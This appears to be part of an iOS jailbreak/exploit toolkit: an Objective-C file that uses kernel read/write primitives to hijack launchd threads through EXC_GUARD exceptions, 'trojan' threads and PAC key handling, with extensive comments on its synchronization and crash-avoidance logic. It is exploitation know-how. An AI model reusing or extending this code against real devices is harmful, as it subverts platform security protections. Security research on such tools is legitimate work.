//
//  remote_call.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <errno.h>
#import <sys/socket.h>
#import <sys/un.h>
#import <unistd.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>
#import <stdatomic.h>
#import <time.h>

#import "RemoteCall.h"
#import "../VPhoneDebug.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/ksafe.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/persistence.h"
#import "../kexploit/xpaci.h"
#import "../utils/process.h"

extern bool gIsPACSupported;
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

// xnu-10002.81.5/osfmk/kern/exc_guard.h
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))


// xnu-10002.81.5/osfmk/mach/arm/_structs.h
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// from pe_main.js
#define SHMEM_CACHE_SIZE                256
#define FAKE_PC_TROJAN_CREATOR          0x101
#define FAKE_LR_TROJAN_CREATOR          0x201
#define FAKE_PC_TROJAN                  0x301
#define FAKE_LR_TROJAN                  0x401

// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
#define BREAKPOINT_ENABLE 481
#define BREAKPOINT_DISABLE 0

uint64_t g_RC_targetProcOverride = 0;
uint64_t g_RC_gadgetPacia = 0;

static pthread_mutex_t g_universal_ipc_mutex;
static pthread_once_t g_universal_ipc_mutex_once = PTHREAD_ONCE_INIT;

static void init_universal_mutex(void)
{
    pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
    pthread_mutex_init(&g_universal_ipc_mutex, &attr);
    pthread_mutexattr_destroy(&attr);
}

// --- in-flight guard + detach gate -------------------------------------------
// A RemoteCall operation (EXC_GUARD hijack, individual remote call, or session
// teardown) holds a corrupted/redirected thread inside the target process.
// Restoring that thread needs the KRW sockets ALIVE — if the background/lock/
// idle detach tears them down mid-flight, the trapped launchd thread is never
// put back and the device black-screens at the next watchdog check
// (live 9.log: 13:42:57 / 16:24:58 black-screens).
//
// Round 2 (live 10.log, panic 17:50:55): waiting for the count to drain is NOT
// enough — the moment init-hijack released its guard, the pending detach ran in
// the same millisecond that fastkill acquired the guard for the actual kill
// (release(init) → acquire(call) gap). So there is also a DETACH GATE: while a
// detach is pending/in progress (gate depth > 0), new acquisitions FAIL FAST,
// and the detacher holds the gate closed across "wait for count==0" + "detach
// sockets". No interleave is possible: count can only be 0-and-stay-0 while the
// gate is closed.
static pthread_mutex_t g_rc_inflight_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  g_rc_inflight_cond  = PTHREAD_COND_INITIALIZER;
// Round 15: _Atomic, not volatile. These are read lock-free (the accessors
// below) while mutated under the mutex — volatile made those lock-free reads
// a C11 data race (UB, no ordering). Mutations under the mutex stay plain
// seq_cst RMWs; the lock-free reads use acquire/release where the read gates
// a subsequent action (stop checkpoint, drain decision).
static _Atomic int     g_rc_inflight_count = 0;
static _Atomic int     g_rc_detach_gate_depth = 0;   // >0: detach pending/running
static _Atomic int     g_rc_stop_requested = 0;

// Per-thread guard hold count: a composite op (the fastkill path) holds an
// EXTERNAL guard across warm-up+kill+verdict, and its inner init/call
// acquisitions nest inside that hold. When the detach gate closes
// mid-composite, refusing the INNER acquisition spuriously aborts an op the
// drain is already waiting on — the detach cannot complete until this thread
// releases anyway. So a thread holding ≥1 guard may acquire NESTED guards even
// while the gate is closed (the same bypass destroy/abandon get, but scoped to
// the holder). All other threads are still refused. Acquire/release pairs are
// always same-thread in this codebase, so a plain __thread counter stays
// balanced.
static __thread int t_rc_guard_held = 0;

static bool remote_call_verbose_logging(void);   // defined below, near RC_DEBUG

// Returns false when the detach gate is closed — the caller must NOT touch the
// target (fail-fast beats starting a call whose KRW dies mid-flight).
// bypassGate is for cleanup paths (destroy/abandon): they are part of the
// in-flight lifecycle — they restore threads — so they always run, holding the
// count (which makes the pending detach wait for THEM).
static bool remote_call_inflight_begin_ex(const char *what, bool bypassGate)
{
    pthread_mutex_lock(&g_rc_inflight_mutex);
    if (!bypassGate && g_rc_detach_gate_depth > 0) {
        if (t_rc_guard_held <= 0) {
            pthread_mutex_unlock(&g_rc_inflight_mutex);
            printf("[RC] detach-gate: acquisition REFUSED (%s) — detach pending/in "
                   "progress, aborting before touching the target\n", what);
            return false;
        }
        // Nested acquisition by a thread already holding a guard: allowed (see
        // t_rc_guard_held). Debug-level only — one line per nested op would
        // spam every composite kill while backgrounded.
        if (remote_call_verbose_logging())
            printf("[RC] detach-gate: nested bypass (%s) — thread already holds "
                   "%d guard(s)\n", what, t_rc_guard_held);
    }
    g_rc_inflight_count++;
    int n = g_rc_inflight_count;
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    t_rc_guard_held++;
    if (n == 1 && remote_call_verbose_logging())
        printf("[RC] guard acquire (%s) — KRW detach must wait\n", what);
    return true;
}

static bool remote_call_inflight_begin(const char *what)
{
    return remote_call_inflight_begin_ex(what, false);
}

static void remote_call_inflight_end(const char *what)
{
    pthread_mutex_lock(&g_rc_inflight_mutex);
    if (g_rc_inflight_count > 0) g_rc_inflight_count--;
    int n = g_rc_inflight_count;
    if (n == 0)
        g_rc_stop_requested = 0;   // stop requests only apply to in-flight ops
    pthread_cond_broadcast(&g_rc_inflight_cond);
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    if (t_rc_guard_held > 0) t_rc_guard_held--;   // pairs with begin_ex (same thread)
    if (n == 0 && remote_call_verbose_logging())
        printf("[RC] guard release (%s) — all RemoteCall ops drained\n", what);
}

int remote_call_inflight_count(void)
{
    // Lock-free read that gates detach decisions: acquire pairs with the
    // release RMWs under the mutex.
    return atomic_load_explicit(&g_rc_inflight_count, memory_order_acquire);
}

bool remote_call_stop_requested(void)
{
    return atomic_load_explicit(&g_rc_stop_requested, memory_order_acquire) != 0;
}

// Defined below with the round-10 snapshot block; request_stop un-arms any
// already-armed target threads so an orphaned EXC_GUARD can never detonate
// against our dead ports (195243/194545 mechanism).
static void rc_armed_snapshot_disarm(const char *why);

void remote_call_request_stop(const char *reason)
{
    if (atomic_load_explicit(&g_rc_inflight_count, memory_order_acquire) <= 0) return;
    // Release: in-flight ops' acquire loads of the flag (their stop
    // checkpoints) must observe this store before they act on it.
    atomic_store_explicit(&g_rc_stop_requested, 1, memory_order_release);
    printf("[RC] stop requested of %d in-flight RemoteCall op(s): %s\n",
           atomic_load_explicit(&g_rc_inflight_count, memory_order_relaxed),
           reason ?: "(no reason)");
    // Round 10: refusing the detach is not enough — an in-flight init may
    // already hold ARMED target threads whose guard exceptions would detonate
    // against our dead ports if the app is killed while suspended. Un-arm
    // them now (KRW still lives precisely because the detach is being made to
    // wait); the init itself aborts at its next stop checkpoint.
    rc_armed_snapshot_disarm(reason);
}

bool remote_call_inflight_wait_drained_ms(int timeoutMs)
{
    pthread_mutex_lock(&g_rc_inflight_mutex);
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec  += timeoutMs / 1000;
    ts.tv_nsec += (long)(timeoutMs % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    while (g_rc_inflight_count > 0) {
        if (pthread_cond_timedwait(&g_rc_inflight_cond, &g_rc_inflight_mutex, &ts) == ETIMEDOUT)
            break;
    }
    bool drained = (g_rc_inflight_count == 0);
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    return drained;
}

// Detach-gate protocol. acquire: close the gate (new acquisitions fail-fast
// from here), then wait up to timeoutMs for in-flight ops to drain. On success
// the gate is HELD CLOSED — the caller detaches, then calls
// remote_call_detach_gate_release(). On timeout the gate is re-opened and
// false is returned (caller must skip the detach). Nestable via a depth
// counter so the detach chokepoint can re-acquire inside an outer hold.
bool remote_call_detach_gate_acquire(int timeoutMs, const char *reason)
{
    pthread_mutex_lock(&g_rc_inflight_mutex);
    g_rc_detach_gate_depth++;
    int depth = g_rc_detach_gate_depth;
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    if (depth == 1)
        printf("[RC] detach-gate: CLOSED (%s) — new acquisitions fail-fast\n",
               reason ?: "(no reason)");
    if (remote_call_inflight_wait_drained_ms(timeoutMs))
        return true;   // gate stays closed; caller detaches, then releases
    pthread_mutex_lock(&g_rc_inflight_mutex);
    if (g_rc_detach_gate_depth > 0) g_rc_detach_gate_depth--;
    bool opened = (g_rc_detach_gate_depth == 0);
    pthread_cond_broadcast(&g_rc_inflight_cond);
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    if (opened)
        printf("[RC] detach-gate: REOPENED (%s) — in-flight ops did not drain "
               "within %d ms\n", reason ?: "(no reason)", timeoutMs);
    return false;
}

void remote_call_detach_gate_release(const char *reason)
{
    pthread_mutex_lock(&g_rc_inflight_mutex);
    if (g_rc_detach_gate_depth > 0) g_rc_detach_gate_depth--;
    int depth = g_rc_detach_gate_depth;
    pthread_cond_broadcast(&g_rc_inflight_cond);
    pthread_mutex_unlock(&g_rc_inflight_mutex);
    if (depth == 0)
        printf("[RC] detach-gate: OPEN (%s) — acquisitions resume\n",
               reason ?: "(no reason)");
}

// External hold for composite operations: pmForceKillViaLaunchd wraps
// session-warm-up + the kill call in ONE hold so a pending detach can never
// slip into the release(init) → acquire(call) gap. Fail-fast like begin().
bool remote_call_guard_acquire_external(const char *what)
{
    return remote_call_inflight_begin_ex(what, false);
}

void remote_call_guard_release_external(const char *what)
{
    remote_call_inflight_end(what);
}

// ---------------------------------------------------------------------------
// Round 10: global snapshot of currently ARMED target threads (AST_GUARD set
// by an in-flight init, trap pending). Lives OUTSIDE the per-thread
// RemoteCallState because remote_call_request_stop() runs on a different
// thread (settings/main) than the in-flight init (kill thread) and must be
// able to un-arm without touching half-built session state. An armed launchd
// thread whose exception port outlives the app is the 195243/194545
// detonator: its next return to userspace raises EXC_GUARD to a dead port and
// launchd dies ("initproc exited"). The 17:45:56 warm-up went silent 145 ms
// into its trap-wait with exactly one thread armed.
//
// Snapshot discipline: add on successful inject; disarm (via KRW) on stop
// request; plain forget once init's own post-trap clear (or an abort path)
// has cleared the guards itself. After init succeeds there are no armed
// threads left (init clears them all right after the first trap), so the
// snapshot only ever covers the walk → first-trap window.
// ---------------------------------------------------------------------------
#define RC_ARMED_SNAPSHOT_MAX 16
// Round 20: entries are OWNER-TAGGED. The snapshot used to be one flat global
// list and rc_armed_snapshot_forget() wiped ALL of it — with two inits in
// flight (071602 double-hijack), whichever init cleared its guards first also
// erased the OTHER session's armed record, blinding the stop path to threads
// that were still armed. The owner token is the session's RemoteCallState
// (opaque here; rc_current_owner is defined next to the state machinery).
static void *rc_current_owner(void);
static void rc_livearm_unregister(uint64_t thread);
static struct { uint64_t thread; void *owner; } g_rc_armed_snapshot[RC_ARMED_SNAPSHOT_MAX];
static int g_rc_armed_snapshot_count = 0;
static pthread_mutex_t g_rc_armed_mutex = PTHREAD_MUTEX_INITIALIZER;

static void rc_armed_snapshot_add(uint64_t thread)
{
    pthread_mutex_lock(&g_rc_armed_mutex);
    if (g_rc_armed_snapshot_count < RC_ARMED_SNAPSHOT_MAX) {
        g_rc_armed_snapshot[g_rc_armed_snapshot_count].thread = thread;
        g_rc_armed_snapshot[g_rc_armed_snapshot_count].owner  = rc_current_owner();
        g_rc_armed_snapshot_count++;
    }
    pthread_mutex_unlock(&g_rc_armed_mutex);
}

// Forget ONLY the calling session's entries. Every call site runs with the
// owning session's state pushed (init / destroy / abandon), so
// rc_current_owner() names exactly that session.
static void rc_armed_snapshot_forget(void)
{
    void *me = rc_current_owner();
    pthread_mutex_lock(&g_rc_armed_mutex);
    int w = 0;
    for (int i = 0; i < g_rc_armed_snapshot_count; i++)
        if (g_rc_armed_snapshot[i].owner != me)
            g_rc_armed_snapshot[w++] = g_rc_armed_snapshot[i];
    g_rc_armed_snapshot_count = w;
    pthread_mutex_unlock(&g_rc_armed_mutex);
}

// Un-arm every snapshotted thread via KRW (clear_guard_exception: AST_GUARD
// off, guard exc-info zeroed) and empty the snapshot. Called from
// remote_call_request_stop — i.e. NOT the init thread — while an init may be
// mid-walk or parked in its trap-wait. Ordering vs an in-flight trap is safe:
//  - thread not yet trapped: AST cleared → it never traps. Init's abort path
//    drains nothing. Clean.
//  - thread already trapped (message queued, AST consumed by the kernel): the
//    clear is a no-op-ish write; the queued message is answered with the
//    thread's own trapped state by the init abort drain
//    (rc_restore_trapped_thread_for_abort) or the first-port responder, so
//    the thread resumes exactly where it was. Never left parked.
//  - thread armed by the walk AFTER this disarm pass: the walk's stop-check
//    at loop top aborts the init, and the abort clears guards from
//    g_RC_threadList itself (not from this snapshot).
// KRW access is serialized by krwLock against the init thread's own ops.
static void rc_armed_snapshot_disarm(const char *why)
{
    uint64_t threads[RC_ARMED_SNAPSHOT_MAX];
    pthread_mutex_lock(&g_rc_armed_mutex);
    int n = g_rc_armed_snapshot_count;
    for (int i = 0; i < n; i++) threads[i] = g_rc_armed_snapshot[i].thread;
    g_rc_armed_snapshot_count = 0;
    pthread_mutex_unlock(&g_rc_armed_mutex);

    if (n <= 0) return;
    if (!kexploit_krw_ready()) {
        printf("[RC] stop/un-arm (%s): %d armed thread(s) but KRW unavailable — "
               "CANNOT un-arm; residual initproc-exit risk if the app dies\n", why, n);
        return;
    }
    for (int i = 0; i < n; i++) {
        clear_guard_exception(threads[i]);
        rc_livearm_unregister(threads[i]);   // round 20: ownership ends with the disarm
    }
    printf("[RC] stop/un-arm (%s): cleared AST_GUARD on %d armed thread(s) — no "
           "orphaned guard exceptions left in the target\n", why, n);
}

// ---------------------------------------------------------------------------
// Round 10: registry of synthetic call threads WE created inside a target.
// They sit parked in the trojan RPC for the session's whole life; a later
// hijack's walk sees them as valid candidates (linked, task matches, tro
// valid), but an armed synthetic thread's AST_GUARD can never fire — it is
// blocked in-kernel waiting for our own exception reply, not heading back to
// userspace — so arming it buys a guaranteed full-length trap-wait stall
// (prime suspect for the 17:45:56 warm-up: injected=1, trap never arrived).
// Register at creation; unregister ONLY when destroy dispatches pthread_exit
// (the kernel then unlinks it from the task). abandon keeps it registered:
// an abandoned synthetic thread stays parked forever and must never be armed.
// A freed-then-zone-reused address staying registered costs at most one
// skipped candidate — negligible against a stalled 10 s warm-up.
// ---------------------------------------------------------------------------
#define RC_SYNTHETIC_REGISTRY_MAX 8
static uint64_t g_rc_synthetic_registry[RC_SYNTHETIC_REGISTRY_MAX];
static int g_rc_synthetic_registry_count = 0;
static pthread_mutex_t g_rc_synthetic_mutex = PTHREAD_MUTEX_INITIALIZER;

static void rc_synthetic_register(uint64_t thread)
{
    if (!thread) return;
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_synthetic_registry_count; i++)
        if (g_rc_synthetic_registry[i] == thread) { known = true; break; }
    if (!known && g_rc_synthetic_registry_count < RC_SYNTHETIC_REGISTRY_MAX)
        g_rc_synthetic_registry[g_rc_synthetic_registry_count++] = thread;
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
}

static void rc_synthetic_unregister(uint64_t thread)
{
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    for (int i = 0; i < g_rc_synthetic_registry_count; i++) {
        if (g_rc_synthetic_registry[i] == thread) {
            g_rc_synthetic_registry[i] =
                g_rc_synthetic_registry[--g_rc_synthetic_registry_count];
            break;
        }
    }
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
}

static bool rc_synthetic_is_known(uint64_t thread)
{
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_synthetic_registry_count; i++)
        if (g_rc_synthetic_registry[i] == thread) { known = true; break; }
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
    return known;
}

// ---------------------------------------------------------------------------
// Round 20: LIVE-SESSION thread registry. Threads armed or hijacked by a live
// session are tagged with that session's owner token; the injection walk must
// NEVER arm a thread another live session owns — arming retargets the victim's
// exception port to our port, so the other session's protocol traps (and its
// restores) starve while we consume its parked thread's re-traps as our own
// (071602: two inits shared trojan 0xffffffe0222ef8e8, sabotaged each other,
// and the surviving session kept a launchd XPC worker parked at 0x201 that
// watchdogd turnstile-blocked on 90 s before the panic). Entries: added at
// arm time; removed when the armed window closes (guard cleared by the owner
// or the stop path) EXCEPT the trojan, which stays registered for the whole
// session (in fallback mode it cycles temp calls for the session's life; in
// synthetic mode keeping it registered costs at most one skipped candidate);
// all of a session's entries are dropped at destroy/abandon.
// ---------------------------------------------------------------------------
#define RC_LIVEARM_MAX 24
static struct { uint64_t thread; void *owner; } g_rc_livearm[RC_LIVEARM_MAX];
static int g_rc_livearm_count = 0;
static pthread_mutex_t g_rc_livearm_mutex = PTHREAD_MUTEX_INITIALIZER;

static void rc_livearm_register(uint64_t thread)
{
    if (!thread) return;
    void *me = rc_current_owner();
    pthread_mutex_lock(&g_rc_livearm_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_livearm_count; i++)
        if (g_rc_livearm[i].thread == thread) { known = true; break; }
    if (!known && g_rc_livearm_count < RC_LIVEARM_MAX) {
        g_rc_livearm[g_rc_livearm_count].thread = thread;
        g_rc_livearm[g_rc_livearm_count].owner  = me;
        g_rc_livearm_count++;
    }
    pthread_mutex_unlock(&g_rc_livearm_mutex);
}

static void rc_livearm_unregister(uint64_t thread)
{
    pthread_mutex_lock(&g_rc_livearm_mutex);
    for (int i = 0; i < g_rc_livearm_count; i++) {
        if (g_rc_livearm[i].thread == thread) {
            g_rc_livearm[i] = g_rc_livearm[--g_rc_livearm_count];
            break;
        }
    }
    pthread_mutex_unlock(&g_rc_livearm_mutex);
}

static void rc_livearm_unregister_owner(void *owner)
{
    pthread_mutex_lock(&g_rc_livearm_mutex);
    int w = 0;
    for (int i = 0; i < g_rc_livearm_count; i++)
        if (g_rc_livearm[i].owner != owner)
            g_rc_livearm[w++] = g_rc_livearm[i];
    g_rc_livearm_count = w;
    pthread_mutex_unlock(&g_rc_livearm_mutex);
}

static bool rc_livearm_owned_by_other(uint64_t thread)
{
    void *me = rc_current_owner();
    pthread_mutex_lock(&g_rc_livearm_mutex);
    bool other = false;
    for (int i = 0; i < g_rc_livearm_count; i++)
        if (g_rc_livearm[i].thread == thread && g_rc_livearm[i].owner != me) {
            other = true; break;
        }
    pthread_mutex_unlock(&g_rc_livearm_mutex);
    return other;
}

// ---------------------------------------------------------------------------
// Round 20: anomalous-session marks. When the first-port responder sees a
// protocol PARK TRAP it answers once and exits (round 19 anti-storm) — but
// that leaves the session with NO responder and a launchd thread parked on
// its first port: kept warm, it is the 071602 bomb (watchdogd turnstile-
// blocked on the parked worker for 90 s → watchdog timeout panic). The
// responder runs state-less by design (the session can be freed under it), so
// it marks the PORT here; the kill path checks the mark before reusing or
// keeping a warm session and tears an anomalous one down with invariant
// repair instead. Marks are cleared at teardown BEFORE the port dies (the
// kernel recycles port names into later sessions).
// ---------------------------------------------------------------------------
#define RC_ANOMALOUS_PORT_MAX 8
static mach_port_t g_rc_anomalous_ports[RC_ANOMALOUS_PORT_MAX];
static int g_rc_anomalous_port_count = 0;
static pthread_mutex_t g_rc_anomalous_mutex = PTHREAD_MUTEX_INITIALIZER;

static void rc_anomalous_port_mark(mach_port_t port)
{
    if (!MACH_PORT_VALID(port)) return;
    pthread_mutex_lock(&g_rc_anomalous_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_anomalous_port_count; i++)
        if (g_rc_anomalous_ports[i] == port) { known = true; break; }
    if (!known && g_rc_anomalous_port_count < RC_ANOMALOUS_PORT_MAX)
        g_rc_anomalous_ports[g_rc_anomalous_port_count++] = port;
    pthread_mutex_unlock(&g_rc_anomalous_mutex);
}

static void rc_anomalous_port_clear(mach_port_t port)
{
    pthread_mutex_lock(&g_rc_anomalous_mutex);
    for (int i = 0; i < g_rc_anomalous_port_count; i++) {
        if (g_rc_anomalous_ports[i] == port) {
            g_rc_anomalous_ports[i] = g_rc_anomalous_ports[--g_rc_anomalous_port_count];
            break;
        }
    }
    pthread_mutex_unlock(&g_rc_anomalous_mutex);
}

static bool rc_anomalous_port_check(mach_port_t port)
{
    pthread_mutex_lock(&g_rc_anomalous_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_anomalous_port_count; i++)
        if (g_rc_anomalous_ports[i] == port) { known = true; break; }
    pthread_mutex_unlock(&g_rc_anomalous_mutex);
    return known;
}

// Round 13: threads armed by a previous arm attempt of THIS init — they never
// trapped within the attempt's wait, so they are almost certainly blocked in
// a kernel wait where AST_GUARD won't fire. The retry walk skips them instead
// of burning another capped wait on the same dead candidates.
static bool rc_thread_tried_this_init(const uint64_t *tried, int triedCount,
                                      uint64_t thread)
{
    for (int i = 0; i < triedCount; i++)
        if (tried[i] == thread) return true;
    return false;
}

// ---------------------------------------------------------------------------
// Round 18: boot-scoped blacklist of threads that were ARMED but never
// trapped. Round 13 remembered them only per-init (triedThreads[]), so every
// new warm-up in the same boot re-armed the same blocked launchd thread and
// paid the 4 s dead-attempt tax again — the user-visible "killing takes
// quite long". The list persists in NSUserDefaults stamped with the same
// boot identity as the KRW primitive/donor triple
// (krw_persistence_stamps_match_current_boot): a list from a previous boot
// is ignored on load (its addresses died with that boot's zones) and the
// first add of this boot overwrites it with fresh stamps. Zone reuse within
// a boot can turn a blacklisted address back into a live thread — the cost
// is one skipped candidate per walk, accepted and bounded by
// RC_TRIED_BLACKLIST_MAX with FIFO eviction (the oldest entry is the most
// likely to have been reused).
// ---------------------------------------------------------------------------
#define RC_TRIED_BLACKLIST_MAX 16
static NSString * const kRCTriedBlacklistKey        = @"com.zeroxjf.cyanide.rc.neverTrapThreads.v1";
static NSString * const kRCTriedBlacklistBootUUIDKey = @"com.zeroxjf.cyanide.rc.neverTrapThreads.bootuuid";
static NSString * const kRCTriedBlacklistBootSecKey  = @"com.zeroxjf.cyanide.rc.neverTrapThreads.bootsec";
static uint64_t g_rc_tried_blacklist[RC_TRIED_BLACKLIST_MAX];
static int g_rc_tried_blacklist_count = 0;
static int g_rc_tried_blacklist_state = 0;   // 0 = not loaded, 1 = loaded, -1 = stale boot (ignore; first add re-stamps)
static pthread_mutex_t g_rc_tried_blacklist_mutex = PTHREAD_MUTEX_INITIALIZER;

static void rc_tried_blacklist_load_locked(void)
{
    if (g_rc_tried_blacklist_state != 0) return;
    NSUserDefaults *d = NSUserDefaults.standardUserDefaults;
    if (!krw_persistence_stamps_match_current_boot(
            [d stringForKey:kRCTriedBlacklistBootUUIDKey],
            [d objectForKey:kRCTriedBlacklistBootSecKey])) {
        g_rc_tried_blacklist_state = -1;
        return;
    }
    NSArray *saved = [d arrayForKey:kRCTriedBlacklistKey];
    int n = 0;
    for (NSNumber *num in saved) {
        if (![num isKindOfClass:NSNumber.class] || n >= RC_TRIED_BLACKLIST_MAX)
            break;
        uint64_t t = num.unsignedLongLongValue;
        if (t) g_rc_tried_blacklist[n++] = t;
    }
    g_rc_tried_blacklist_count = n;
    g_rc_tried_blacklist_state = 1;
    if (n)
        printf("[RC] never-trap blacklist: loaded %d boot-scoped entr%s — "
               "warm-ups skip known dead candidates\n", n, n == 1 ? "y" : "ies");
}

static bool rc_tried_blacklist_contains(uint64_t thread)
{
    if (!thread) return false;
    pthread_mutex_lock(&g_rc_tried_blacklist_mutex);
    rc_tried_blacklist_load_locked();
    bool found = false;
    for (int i = 0; i < g_rc_tried_blacklist_count; i++)
        if (g_rc_tried_blacklist[i] == thread) { found = true; break; }
    pthread_mutex_unlock(&g_rc_tried_blacklist_mutex);
    return found;
}

static void rc_tried_blacklist_add(uint64_t thread)
{
    if (!thread) return;
    pthread_mutex_lock(&g_rc_tried_blacklist_mutex);
    rc_tried_blacklist_load_locked();
    bool known = false;
    for (int i = 0; i < g_rc_tried_blacklist_count; i++)
        if (g_rc_tried_blacklist[i] == thread) { known = true; break; }
    if (!known) {
        if (g_rc_tried_blacklist_count < RC_TRIED_BLACKLIST_MAX) {
            g_rc_tried_blacklist[g_rc_tried_blacklist_count++] = thread;
        } else {
            memmove(&g_rc_tried_blacklist[0], &g_rc_tried_blacklist[1],
                    sizeof(uint64_t) * (RC_TRIED_BLACKLIST_MAX - 1));
            g_rc_tried_blacklist[RC_TRIED_BLACKLIST_MAX - 1] = thread;
        }
        NSMutableArray *out =
            [NSMutableArray arrayWithCapacity:(NSUInteger)g_rc_tried_blacklist_count];
        for (int i = 0; i < g_rc_tried_blacklist_count; i++)
            [out addObject:@(g_rc_tried_blacklist[i])];
        NSUserDefaults *d = NSUserDefaults.standardUserDefaults;
        [d setObject:out forKey:kRCTriedBlacklistKey];
        NSString *bootUUID = krw_persistence_current_boot_uuid();
        [d setObject:(bootUUID ?: @"") forKey:kRCTriedBlacklistBootUUIDKey];
        [d setObject:@(krw_persistence_current_boot_time_sec())
            forKey:kRCTriedBlacklistBootSecKey];
        printf("[RC] never-trap blacklist: +thread %#llx (%d boot-scoped "
               "entr%s) — future warm-ups skip it\n",
               thread, g_rc_tried_blacklist_count,
               g_rc_tried_blacklist_count == 1 ? "y" : "ies");
    }
    pthread_mutex_unlock(&g_rc_tried_blacklist_mutex);
}

// Remote-call-layer hard-stop for the kill wrapper (round 5): a remote kill()
// with x0 <= 1 is never legitimate — kill(0, sig) from a hijacked pid-1 thread
// is a process-group kill that ends launchd itself (instant "initproc exited",
// panic-full-2026-09-29-194545). The register build writes every arg fresh
// into the exception reply, so x0 <= 1 here means a caller bug, not a stale
// register — refuse loudly either way. x0 > 500000 is not a real pid either
// (procmgr_fill_entry uses the same bound).
static bool remote_call_kill_args_sane(const char *name, uint64_t x0, const char *via)
{
    if (!name || strcmp(name, "kill") != 0) return true;
    if (x0 <= 1 || x0 > 500000) {
        printf("[RC] GUARD: REFUSING to dispatch kill() with pid=%llu via %s — "
               "call blocked before dispatch (kill(0/1, SIGKILL) from a "
               "hijacked launchd thread ends launchd itself)\n",
               (unsigned long long)x0, via);
        log_user("[RC] GUARD: refused remote kill() with bogus pid=%llu (%s) — "
                 "blocked before dispatch\n", (unsigned long long)x0, via);
        return false;
    }
    return true;
}

uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
bool remote_read_internal(uint64_t src, void *dst, uint64_t size);
bool remote_write_internal(uint64_t dst, const void *src, uint64_t size);
int destroy_remote_call_internal(void);
void abandon_remote_call_internal(void);
static int init_remote_call_internal(const char* process, bool useMigFilterBypass);

static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
static __thread uint32_t g_RC_lastInitFailurePid = 0;

typedef struct RemoteCallState {
    uint64_t taskAddr;
    bool creatingExtraThread;
    mach_port_t firstExceptionPort;
    mach_port_t secondExceptionPort;
    uint64_t firstExceptionPortAddr;
    uint64_t secondExceptionPortAddr;
    pthread_t dummyThread;
    mach_port_t dummyThreadMach;
    uint64_t dummyThreadAddr;
    uint64_t dummyThreadTro;
    uint64_t selfThreadAddr;
    uint32_t selfThreadCtid;
    arm_thread_state64_internal originalState;
    uint64_t vmMap;
    uint64_t callThreadAddr;
    uint64_t callThreadPort;   // round 24: mach port name of the synthetic
                               // thread in the target — lets a mid-init
                               // teardown thread_terminate an orphaned
                               // never-resumed synthetic via the temp channel
    uint64_t trojanThreadAddr;
    int pid;
    bool success;
    NSMutableArray<NSNumber *> *threadList;
    uint64_t trojanMem;
    struct VMShmem shmemCache[SHMEM_CACHE_SIZE];
    uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
    uint64_t shmemClock;
    uint64_t shmemEvictions;
    int firstExceptionTimeoutMS;
    int stableExceptionTimeoutFloorMS;
    bool originalThreadOnly;
    bool vphoneBridge;
    // Round 17: session PAC-key cache. remote_pac used to re-read the signing
    // keys from trojanThreadAddr on EVERY sign; that thread returns to launchd
    // duty once restored and can exit at any time — after which every sign
    // used zero/garbage keys and every dispatch crashed the synthetic thread
    // on resume (12:31:23: crash-loop of 8 queued traps, then an escalation
    // that SIGBUSed launchd 26 s after teardown). Captured once at init from
    // the provably-live trojan thread; userspace threads of one task share
    // these keys, so the cache stays valid for the session's whole life.
    uint64_t pacKeyA;
    uint64_t pacKeyB;
    bool pacKeysCached;
} RemoteCallState;

static RemoteCallState g_RC_defaultState = { .success = true, .stableExceptionTimeoutFloorMS = 10000 };
static __thread RemoteCallState *g_RC_currentState;

@interface RemoteCallSession ()
- (RemoteCallState *)remoteCallStatePointer;
@end

static RemoteCallState *remote_call_current_state(void)
